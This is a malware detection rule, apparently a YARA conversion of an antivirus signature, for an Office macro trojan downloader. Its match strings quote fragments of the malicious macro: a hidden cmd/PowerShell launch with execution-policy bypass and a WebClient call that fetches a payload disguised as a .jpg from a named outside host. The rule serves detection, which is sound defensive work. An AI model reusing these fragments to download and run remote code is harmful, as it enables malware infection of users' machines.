
rule TrojanDownloader_O97M_Powdow_E_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.E!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {53 68 65 6c 6c 52 75 6e 6e 65 72 2e 52 75 6e 20 22 63 6d 64 20 2f 63 20 70 6f 77 65 72 73 68 65 6c 6c 20 2d 65 70 20 62 79 70 61 73 73 20 2d 63 } //1 ShellRunner.Run "cmd /c powershell -ep bypass -c
		$a_01_1 = {24 73 74 72 65 61 6d 3d 24 77 65 62 43 6c 69 65 6e 74 2e 4f 70 65 6e 52 65 61 64 28 27 68 74 74 70 3a 2f 2f 6d 69 6e 65 2e 66 6f 72 74 69 70 6f 77 65 72 2e 63 6f 6d 2f 73 68 6c 6f 61 64 2e 6a 70 67 27 29 3b } //1 $stream=$webClient.OpenRead('http://mine.fortipower.com/shload.jpg');
		$a_01_2 = {73 68 65 6c 6c 6c 6f 61 64 3b 22 2c 20 30 2c 20 54 72 75 65 } //1 shellload;", 0, True
		$a_01_3 = {2c 20 22 23 22 2c 20 22 22 29 29 } //1 , "#", ""))
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}